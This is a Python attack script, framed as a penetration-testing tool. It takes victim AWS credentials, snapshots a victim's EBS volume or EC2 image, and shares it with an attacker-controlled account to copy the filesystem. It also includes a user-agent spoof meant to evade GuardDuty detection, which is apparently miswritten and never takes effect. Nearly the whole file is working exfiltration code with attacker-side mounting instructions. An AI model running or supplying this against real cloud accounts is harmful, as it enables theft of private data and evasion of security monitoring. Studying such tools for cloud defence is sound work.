#!/usr/bin/python3
#
# This script abuses insecure permissions given to the EC2 IAM Role to exfiltrate target EC2's
# filesystem data in a form of it's shared EBS snapshot or publicly exposed AMI image.
#
# CreateSnapshot:
#   Abuses:
#       ec2:CreateSnapshot
#       ec2:ModifySnapshotAttribute
#
#   The script will firstly create an EBS volume snapshot of the provided volume id. Then it will
#   modify that snapshot's attributes to make it available for the foreign AWS Account that's going to 
#   be the Attacker's account. Then, the attacker will be able to create an EBS volume out of that snapshot.
#   After doing so, the script will stop specified by the Attacker EC2 instance in order to later on attach it
#   with a previously created volume. Afterwards, the instance will be restarted and the attacker will be able
#   to mount freshly attached volume in the operating system to further examine its contents.
#
#   This technique is safe to be demonstrated during AWS Penetration tests.
#
#
# CreateImage:
#   Abuses:
#       ec2:CreateImage
#       ec2:ModifyImageAttribute
#
#   NOT FULLY IMPLEMENTED YET.
#   For this technique, the procedure is following - the script will create an image out of specified victim's EC2 
#   instance. This image will become publicly available (caution with client sensitive data!). After that, the script
#   will attempt to create/import public SSH RSA keys to the attacker's account and then create an EC2 instance using that
#   publicly available just created AMI image. Ultimately, the attacker will be able to SSH into newly created box to
#   further examine it's filesystem contents.
#   
#   WARNING: Since this method creates a publicly available AMI image that will contain customer sensitive data, it is 
#   not recommended to use it during legal AWS Penetration Tests 
#
# Author: Mariusz Banach / mgeeky, '19, <mb@binary-offensive.com>
#
 
import sys
import pyjq
import json
import time
import boto3
import argparse
from botocore.exceptions import ClientError

config = {
    'verbose' : False,
    'region' : '',
    'victim' : {
        'profile' : '',
        'access-key' : '',
        'secret-key' : '',
        'token' : '',
    },
    'attacker' : {
        'profile' : '',
        'access-key' : '',
        'secret-key' : '',
        'token' : '',
    },
    'method' : '',
    'volume-id': '',
    'instance-id': '',
    'attach-instance-id': '',
}

class Logger:
    @staticmethod
    def _out(x): 
        sys.stdout.write(x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[>] ' + x)
    
    @staticmethod
    def info(x):
        if config['verbose']:
            Logger._out('[.] ' + x)
    
    @staticmethod
    def fatal(x): 
        sys.stdout.write('[!] ' + x + '\n')
        sys.exit(1)
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)


class ExfiltrateEC2:
    session = None
    def __init__(self, region, attacker_keys, victim_keys):
        self.region = region
        self.keys = {
            'attacker' : {},
            'victim' : {},
        }
        self.keys['attacker'] = attacker_keys
        self.keys['victim'] = victim_keys
        self.session = {
            'attacker' : None,
            'victim' : None,
        }

        Logger.info(f"Using region: {region}")
        
        Logger.info("Authenticating using Attacker's AWS credentials...")
        self.session['attacker'] = self.authenticate(region, attacker_keys)

        Logger.info("Authenticating using Victim's AWS credentials...")
        self.session['victim'] = self.authenticate(region, victim_keys)

    def authenticate(self, region, keys):
        session = None
        try:
            if keys['profile']:
               session = boto3.Session(
                    profile_name = keys['profile'],
                    region_name = region
                )
            else: 
                session = boto3.Session(
                    aws_access_key_id = keys['access-key'],
                    aws_secret_access_key = keys['secret-key'],
                    aws_session_token = keys['token'],
                    region_name = region
                )
        except Exception as e:
            Logger.fail(f'Could not authenticate to AWS: {e}')
            raise e

        return session

    def get_session(self, whose):
        return self.session[whose]

    def get_account_id(self, whose):
        try:
            return self.session[whose].client('sts').get_caller_identity()['Account']
        except Exception as e:
            Logger.fatal(f'Could not Get Caller\'s identity: {e}')

    def create_snapshot(self, attacker_instance_id, volume_id, availability_zone):
        victim_client = self.session['victim'].client('ec2')
        attacker_client = self.session['attacker'].client('ec2')

        target_user = self.get_account_id('attacker')

        snapshot = None
        volume_created = None
        modify_result = None

        Logger.out(f"Step 1: Creating EBS volume snapshot. VolumeId = {volume_id}")
        try:
            snapshot = victim_client.create_snapshot(
                Description = f'Exfiltrated EBS snapshot of volume: {volume_id}',
                VolumeId = volume_id
            )
            Logger.ok(f"Snapshot of volume {volume_id} created: {snapshot['SnapshotId']}")
        except Exception as e:
            Logger.fatal(f"ec2:CreateSnapshot action on Victim failed. Exception: {e}")

        Logger.out(f"Step 2: Modifying snapshot attributes to share it with UserId = {target_user}")
        try:
            modify_result = victim_client.modify_snapshot_attribute(
                Attribute = f'createVolumePermission',
                OperationType = 'add',
                SnapshotId = snapshot['SnapshotId'],
                UserIds = [
                    target_user,
                ]
            )
            Logger.ok(f"Snapshot's attributes modified to share it with user {target_user}")
        except Exception as e:
            Logger.fatal(f"ec2:ModifySnapshotAttribute action on Victim failed. Exception: {e}")

        Logger.out(f"Step 3: Waiting for the snapshot to transit into completed state.")
        try:
            victim_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot['SnapshotId']])
        except Exception as e:
            Logger.fail(f"boto3 Waiter for snapshot completed state failed. Exception: {e}")
            Logger.info("Waiting in a traditional manner: 3 minutes.")

            time.sleep(3 * 60)

        Logger.out(f"Step 4: Creating EBS volume in Attacker's {target_user} AWS account.")

        attacker_instance_data = None
        try:
            if not availability_zone:
                availability_zone = self.region + 'a'
                attacker_instance = attacker_client.describe_instances(
                    InstanceIds = [attacker_instance_id, ]
                )

                for inst in attacker_instance['Reservations'][0]['Instances']:
                    if inst['InstanceId'] == attacker_instance_id:
                        availability_zone = inst['Placement']['AvailabilityZone']
                        attacker_instance_data = inst
                        Logger.info(f"Obtained Attacker's EC2 instance Availbility Zone automatically: {availability_zone}")
                        break
        except Exception as e:
            Logger.fail(f"THIS MAY BE FATAL: Could not enumerate attacker's instance with given InstanceId = {attacker_instance_id}")
            Logger.fail(f"Exception: {e}")
            raise e
            availability_zone = self.region + 'a'

        try:
            volume_created = attacker_client.create_volume(
                AvailabilityZone = availability_zone,
                Encrypted = False,
                VolumeType = 'gp2',
                SnapshotId = snapshot['SnapshotId']
            )
            Logger.ok(f"Created EBS volume ({volume_created['VolumeId']} at Attacker's side out from exfiltrated snapshot ({snapshot['SnapshotId']})")
        except Exception as e:
            Logger.fail(f"ec2:CreateVolume action on Attacker failed. Exception: {e}")

        Logger.out(f"Step 5: Waiting for the volume to transit into created state.")
        try:
            attacker_client.get_waiter('volume_available').wait(VolumeIds=[volume_created['VolumeId']])
        except Exception as e:
            Logger.fail(f"boto3 Waiter for volume available failed. Exception: {e}")
            Logger.info("Waiting in a traditional manner: 3 minutes.")

            time.sleep(3 * 60)

        Logger.out(f"Step 6: Attaching created EBS volume to Attacker's specified EC2 instance")
        try:
            attacker_client.attach_volume(
                Device = '/dev/xvdf',
                InstanceId = attacker_instance_id,
                VolumeId = volume_created['VolumeId']
            )
            Logger.ok(f"Attached volume to the specified Attacker's EC2 instance: {attacker_instance_id}")
        except Exception as e:
            if 'IncorrectInstanceState' in str(e):
                Logger.fail("Attacker's machine is in running state, preventing to attach it a volume.")
                Logger.info("Trying to stop the EC2 instance, then attach the volume and then restart it.")

                try:
                    attacker_instance = attacker_client.stop_instances(
                        InstanceIds = [attacker_instance_id, ]
                    )
                    attacker_client.get_waiter('instance_stopped').wait(InstanceIds = [attacker_instance_id, ])
                    attacker_client.attach_volume(
                        Device = '/dev/xvdf',
                        InstanceId = attacker_instance_id,
                        VolumeId = volume_created['VolumeId']
                    )
                    Logger.ok(f"Attached volume to the specified Attacker's EC2 instance: {attacker_instance_id}")
                except Exception as e:
                    Logger.fail(f"ec2:AttachVolume action on Attacker failed. Exception: {e}")
                    Logger.fail("Tried to automatically stop attacker's EC2 instance, then attach volume and restart it, but that failed as well.")
                    Logger.fail(f"Exception: " + str(e))

                Logger.info("Restarting it...")
                attacker_instance = attacker_client.start_instances(
                    InstanceIds = [attacker_instance_id, ]
                )
                attacker_client.get_waiter('instance_running').wait(InstanceIds = [attacker_instance_id, ])

                try:
                    attacker_instance = attacker_client.describe_instances(
                        InstanceIds = [attacker_instance_id, ]
                    )
                    for inst in attacker_instance['Reservations'][0]['Instances']:
                        if inst['InstanceId'] == attacker_instance_id:
                            attacker_instance_data = inst
                            break
                except: pass
            else:
                Logger.fail(f"ec2:AttachVolume action on Attacker failed. Exception: {e}")

        try:
            Logger.out(f"Cleanup. Trying to remove created snapshot ({snapshot['SnapshotId']}) at Victim's estate...")
            victim_client.delete_snapshot(SnapshotId = snapshot['SnapshotId'])
            Logger.ok(f"Snapshot removed.")
        except Exception as e:
            Logger.fail(f"(That's ok) ec2:DeleteSnapshot action on Victim failed. Exception: {e}")

        ssh_command = 'SSH to the attacker\'s EC2 instance\n'
        if attacker_instance_data:
            try:
                ip = attacker_instance_data['PublicIpAddress']
            except:
                Logger.fail(f"Could not obtain Attacker's EC2 Public ip address. Available fields:\n {attacker_instance_data}\n")
                ip = "ec2-ip-address"

            if ip:
                ssh_command = f'''SSH to the attacker's EC2 instance
        # ssh ec2-user@{ip}
'''

        print(f'''
===============================================================
[MODULE FINISHED]
===============================================================

[+] Exfiltrated snapshot of a victim's EBS volume:
    VictimVolumeId = {volume_id}

[+] By creating a snapshot of it, shared to the attacker's AWS user ID.
    SnapshotId = {snapshot['SnapshotId']}

If everything went fine, Attacker's AWS account {target_user} should have a EBS volume now:
    AttackerVolumeId = {volume_created['VolumeId']}

That was attached to the specified attacker's EC2 instance:
    AttackerInstanceId = {attacker_instance_id}
    AvailibityZone = {availability_zone}

Most likely as a '/dev/xvdf' device. 

===============================================================
To examine exfiltrated data:

    0) {ssh_command}
    1) List block devices mapped:
        # lsblk
    
    2) If above listing yielded mapped block device, e.g. xvdf, create a directory for it:
        # mkdir /exfiltrated

    3) Mount that device's volume:
        # mount /dev/xvdf1 /exfiltrated

    4) Review it's contents:
        # ls -l /exfiltrated
''')
        return True

    def create_image(self, instance_id, image_name, image_description):
        victim_client = self.session['victim'].client('ec2')
        attacker_client = self.session['attacker'].client('ec2')

        created_image = None
        try:
            Logger.out("Step 1: Creating a publicly available AMI image out of specified EC2 instance.")
            created_image = victim_client.create_image(
                InstanceId = instance_id,
                Name = image_name,
                Description = image_description
            )
            Logger.ok(f"AMI Image with name: ({image_name}) created: {created_image['ImageId']}")
        except Exception as e:
            Logger.fatal(f"ec2:CreateImage action on Victim failed. Exception: {e}")

        target_user = self.get_account_id('attacker')
        Logger.out(f"Step 2: Modifying image attributes to share it with UserId = {target_user}")
        try:
            modify_result = victim_client.modify_image_attribute(
                Attribute = 'launchPermission',
                ImageId = created_image['ImageId'],
                OperationType = 'add',
                UserIds = [
                    target_user,
                ]
            )
            Logger.ok(f"Image's attributes modified to share it with user {target_user}")
        except Exception as e:
            Logger.fatal(f"ec2:ModifyImageAttribute action on Victim failed. Exception: {e}")

        # Step 3: Import custom SSH RSA public key
        #          client.import_key_pair(
        #               KeyName = "Some key name"
        #               PublicKeyMaterial = "key material"
        #          )

        # Step 4: Create an instance from exported AMI
        #          client.run_instances(
        #               ImageId = "ami-00000000",
        #               SecurityGroupIds = ["sg-00000", ],
        #               SubnetId = "subnet-aaaaaa",
        #               Count = 1,
        #               InstanceType = "t2.micro",
        #               KeyName = "Some key name",
        #               Query = "Instances[0].InstanceId",
        #          )
        #         Returns:
        #               "i-00001111002222"

        # Step 5: Connect to that EC2 instance
        #         client.describe_instances(
        #               InstanceIds = ["i-00001111002222"],
        #               Query = "Reservations[0].Instances[0].PublicIpAddress"
        #         )
        #         Returns:
        #               "1.2.3.4"
        #       
        #   $ ssh ec2-user@1.2.3.4
        #   $ ls -l

        print(f"""
===============================================================
[!] REST OF THE EXPLOIT LOGIC HAS NOT BEEN IMPLEMENTED YET.
===============================================================

[.] You can proceed manually from this point:

    1) Create an EC2 instance in region: {self.region}

    2) Make sure this EC2 instance is being created out of public AMI image with ID:
        Image ID: {created_image['ImageId']}

    3) Setup SSH keys, Security Groups, etc.

    4) SSH into that machine.

Created EC2 instance's filesystem will be filled with files coming from the exfiltrated EC2.
""")

def parseOptions(argv):
    global config

    print('''
        :: exfiltrate-ec2
        Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
''')

    parser = argparse.ArgumentParser(prog = argv[0])
    parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')
    optional = parser.add_argument_group('optional arguments')

    attacker = parser.add_argument_group('Attacker\'s AWS credentials - where to instantiate exfiltrated EC2')
    victim = parser.add_argument_group('Victim AWS credentials - where to find EC2 to exfiltrate')

    required.add_argument('--region', type=str, help = 'AWS Region to use.')

    attacker.add_argument('--profile', type=str, help = 'Attacker\'s AWS Profile name to use if --access-key was not specified', default = 'default')
    attacker.add_argument('--access-key', type=str, help = 'Attacker\'s AWS Access Key ID to use if --profile was not specified')
    attacker.add_argument('--secret-key', type=str, help = 'Attacker\'s AWS Secret Key ID')
    attacker.add_argument('--token', type=str, help = '(Optional) Attacker\'s AWS temporary session token')

    victim.add_argument('--victim-profile', type=str, help = 'Victim\'s AWS Profile name to use if --access-key was not specified')
    victim.add_argument('--victim-access-key', type=str, help = 'Victim\'s AWS Access Key ID to use if --profile was not specified')
    victim.add_argument('--victim-secret-key', type=str, help = 'Victim\'s AWS Secret Key ID')
    victim.add_argument('--victim-token', type=str, help = '(Optional) Victim\'s AWS temporary session token')

    optional.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')

    subparsers = parser.add_subparsers(help='Available methods', dest='method')

    a = 'Creates a snapshot of a running or stopped EC2 instance in an AMI image form.'\
        ' This AMI image will then be shared with another AWS account, constituing exfiltration opportunity.'
    createimage = subparsers.add_parser('createimage', help = a)
    createimage.add_argument('--instance-id', help = '(Required) Specifies instance id (i-...) to create an image of.')
    createimage.add_argument('--image-name', default = "Exfiltrated AMI image", type=str, help = '(Optional) Specifies a name for newly created AMI image. Default: "Exfiltrated AMI image"')
    createimage.add_argument('--image-desc', default = "Exfiltrated AMI image", type=str, help = '(Optional) Specifies a description for newly created AMI image. Default: "Exfiltrated AMI image"')

    b = 'Creates a snapshot of an EBS volume used by an EC2 instance.'\
        ' This snapshot will then be shared with another AWS account, constituing exfiltration opportunity.'
    createsnapshot = subparsers.add_parser('createsnapshot', help = b)
    createsnapshot.add_argument('--volume-id', help = '(Required) Specifies EBS volume id (vol-...) to create a snapshot of.')
    createsnapshot.add_argument('--attach-instance-id', help = '(Required) Specifies Attacker\'s instance ID where snapshot should be attached as a volume (i-...). This instance must be created in the same region as specified and must be in a STOPPED state. Otherwise, this script will automatically stop the instance and then restart it after attaching volume.')
    createsnapshot.add_argument('--availability-zone', help = '(Optional) Specifies in which Attacker\'s EC2 instance availability zone was placed. If this parameter is not specified, the program will try to invoke ec2:DescribeInstances to find that information automatically.')

    args = parser.parse_args()

    config['verbose'] = args.verbose
    config['region'] = args.region

    if args.method == 'createimage':
        if args.instance_id != None:
            config['instance-id'] = args.instance_id
        else:
            Logger.fatal('--instance-id parameter is required for this to work.')

    if args.method == 'createsnapshot':
        if args.volume_id != None and args.attach_instance_id != None: 
            config['volume-id'] = args.volume_id
            config['attach-instance-id'] = args.attach_instance_id
            config['availability-zone'] = args.availability_zone
        else:
            Logger.fatal('--volume-id and --attach-instance-id parameters are required for this to work.')

    if not args.region:
        Logger.fatal("Please provide AWS region to operate in.")

    if args.profile and (args.access_key or args.secret_key or args.token):
        Logger.fatal("There should only be used either profile name or raw credentials for Attacker's AWS keys!")

    if args.victim_profile and (args.victim_access_key or args.victim_secret_key or args.victim_token):
        Logger.fatal("There should only be used either profile name or raw credentials for Victim's AWS keys!")

    if args.profile:
        config['attacker']['profile'] = args.profile
        Logger.info(f"Using attacker's profile: {args.profile}")
    elif args.access_key and args.secret_key:
        config['attacker']['access-key'] = args.access_key
        config['attacker']['secret-key'] = args.secret_key
        config['attacker']['token'] = args.token
        Logger.info(f"Using passed Attacker's AWS credentials: ******{args.access_key[-6:]}")
    else:
        Logger.fatal("Both access key and secret key must be specified for Attacker's AWS credentials if profile was not used!")

    if args.victim_profile:
        config['victim']['profile'] = args.victim_profile
        Logger.info(f"Using victim's profile: {args.victim_profile}")
    elif args.victim_access_key and args.victim_secret_key:
        config['victim']['access-key'] = args.victim_access_key
        config['victim']['secret-key'] = args.victim_secret_key
        config['victim']['token'] = args.victim_token
        Logger.info(f"Using passed Victim's AWS credentials: ******{args.victim_access_key[-6:]}")
    else:
        Logger.fatal("Both access key and secret key must be specified for Victim's AWS credentials if profile was not used!")

    return args

def monkeyPatchBotocoreUserAgent():
    '''
    This is to avoid triggering GuardDuty 'PenTest:IAMUser/KaliLinux' alerts
    Source:
      https://www.thesubtlety.com/post/patching-boto3-useragent/
    
    '''
    import sys
    import boto3
    import botocore

    try:
        from _pytest.monkeypatch import MonkeyPatch
    except (ImportError, ModuleNotFoundError) as e:
        print('[!] Please install "pytest" first: pip3 install pytest')
        print('\tthis will be used to patch-up boto3 library to avoid GuardDuty Kali detection')
        sys.exit(0)

    monkeypatch = MonkeyPatch()
    def my_user_agent(self):
        return "Boto3/1.9.89 Python/2.7.12 Linux/4.2.0-42-generic"

        monkeypatch.setattr(botocore.session.Session, 'user_agent', my_user_agent)

def main(argv):
    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    monkeyPatchBotocoreUserAgent()

    exp = ExfiltrateEC2(
        opts.region,
        config['attacker'],
        config['victim'],
    )

    if opts.method == 'createimage':
        Logger.info("Abusing ec2:CreateImage...")
        exp.create_image(opts.instance_id, opts.image_name, opts.image_desc)

    elif opts.method == 'createsnapshot':
        Logger.out("Abusing dangerous ec2:CreateSnapshot and ec2:ModifySnapshotAttribute...\n")
        exp.create_snapshot(opts.attach_instance_id, opts.volume_id, opts.availability_zone)

    else:
        Logger.fatal(f"Unknown method specified: {opts.method}")
    
if __name__ == '__main__':
    main(sys.argv)
